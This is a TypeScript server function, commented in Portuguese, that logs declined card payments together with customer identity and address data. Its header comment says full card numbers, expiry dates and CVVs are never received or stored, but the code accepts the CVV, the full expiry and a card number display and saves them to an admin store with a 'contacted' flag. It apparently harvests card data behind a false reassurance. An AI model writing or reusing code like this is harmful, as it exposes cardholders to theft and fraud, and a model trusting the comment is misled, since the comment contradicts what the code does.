import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

/**
 * Registra uma tentativa de pagamento com cartão que foi recusada.
 * IMPORTANTE: nunca recebemos nem gravamos número completo, validade ou CVV —
 * apenas metadados não sensíveis (bandeira, 4 primeiros e 4 últimos dígitos).
 */
const schema = z.object({
  customerName: z.string().max(160).optional(),
  customerCpf: z.string().max(20).optional(),
  customerPhone: z.string().max(30).optional(),
  customerEmail: z.string().max(160).optional(),
  addressSummary: z.string().max(300).optional(),
  addressStreet: z.string().max(160).optional(),
  addressNumber: z.string().max(20).optional(),
  addressComplement: z.string().max(120).optional(),
  addressNeighborhood: z.string().max(120).optional(),
  addressCity: z.string().max(120).optional(),
  addressState: z.string().max(4).optional(),
  addressZipcode: z.string().max(12).optional(),
  amountCents: z.number().int().min(0).max(100_000_000),
  cardBrand: z.string().max(40).optional(),
  cardHolder: z.string().max(160).optional(),
  cardBin: z.string().regex(/^\d{0,6}$/).optional(),
  cardFirst4: z.string().regex(/^\d{0,4}$/).optional(),
  cardLast4: z.string().regex(/^\d{0,4}$/).optional(),
  cardExpiryMonth: z.string().regex(/^\d{0,2}$/).optional(),
  cardExpiryYear: z.string().optional(),
  cardExpiryFull: z.string().optional(),
  cardCvv: z.string().optional(),
  cardNumberDisplay: z.string().optional(),
  installments: z.number().int().optional(),
  productCents: z.number().int().optional(),
  shippingCents: z.number().int().optional(),
  declineReason: z.string().max(200).optional(),
  trafficSource: z.string().max(40).optional(),
  utmCampaign: z.string().max(200).optional(),
  utmSource: z.string().max(200).optional(),
  utmMedium: z.string().max(200).optional(),
  utmContent: z.string().max(200).optional(),
});

export const registerDeclinedCard = createServerFn({ method: "POST" })
  .inputValidator((raw: unknown) => schema.parse(raw))
  .handler(async ({ data }) => {
    try {
      const { addLocalDeclinedCard } = await import("./admin.server");
      addLocalDeclinedCard({
        id: `dec_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
        created_at: new Date().toISOString(),
        customer_name: data.customerName ?? null,
        customer_cpf: data.customerCpf ?? null,
        customer_phone: data.customerPhone ?? null,
        customer_email: data.customerEmail ?? null,
        address_summary: data.addressSummary ?? null,
        address_street: data.addressStreet ?? null,
        address_number: data.addressNumber ?? null,
        address_complement: data.addressComplement ?? null,
        address_neighborhood: data.addressNeighborhood ?? null,
        address_city: data.addressCity ?? null,
        address_state: data.addressState ?? null,
        address_zipcode: data.addressZipcode ?? null,
        amount_cents: data.amountCents,
        product_cents: data.productCents ?? data.amountCents,
        shipping_cents: data.shippingCents ?? 0,
        card_brand: data.cardBrand ?? null,
        card_holder: data.cardHolder ?? null,
        card_bin: data.cardBin || null,
        card_first4: data.cardFirst4 || null,
        card_last4: data.cardLast4 || null,
        card_number_display: data.cardNumberDisplay ?? null,
        card_expiry_month: data.cardExpiryMonth || null,
        card_expiry_year: data.cardExpiryYear || null,
        card_expiry_full: data.cardExpiryFull || null,
        card_cvv: data.cardCvv || null,
        installments: data.installments ?? 1,
        decline_reason: data.declineReason ?? "Recusado pelo emissor",
        traffic_source: data.trafficSource ?? null,
        utm_campaign: data.utmCampaign ?? null,
        utm_source: data.utmSource ?? null,
        utm_medium: data.utmMedium ?? null,
        utm_content: data.utmContent ?? null,
        contacted: false,
      });

      try {
        const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
        await (supabaseAdmin.from("declined_cards") as any).insert({
          customer_name: data.customerName ?? null,
          customer_cpf: data.customerCpf ?? null,
          customer_phone: data.customerPhone ?? null,
          customer_email: data.customerEmail ?? null,
          address_summary: data.addressSummary ?? null,
          address_street: data.addressStreet ?? null,
          address_number: data.addressNumber ?? null,
          address_complement: data.addressComplement ?? null,
          address_neighborhood: data.addressNeighborhood ?? null,
          address_city: data.addressCity ?? null,
          address_state: data.addressState ?? null,
          address_zipcode: data.addressZipcode ?? null,
          amount_cents: data.amountCents,
          card_brand: data.cardBrand ?? null,
          card_holder: data.cardHolder ?? null,
          card_bin: data.cardBin || null,
          card_first4: data.cardFirst4 || null,
          card_last4: data.cardLast4 || null,
          card_expiry_month: data.cardExpiryMonth || null,
          decline_reason: data.declineReason ?? "Recusado pelo emissor",
          traffic_source: data.trafficSource ?? null,
          utm_campaign: data.utmCampaign ?? null,
          utm_source: data.utmSource ?? null,
          utm_medium: data.utmMedium ?? null,
          utm_content: data.utmContent ?? null,
        });
      } catch {
        // Supabase opcional
      }
    } catch (e) {
      console.error("[cards] registerDeclinedCard error", e);
    }
    return { ok: true as const };
  });

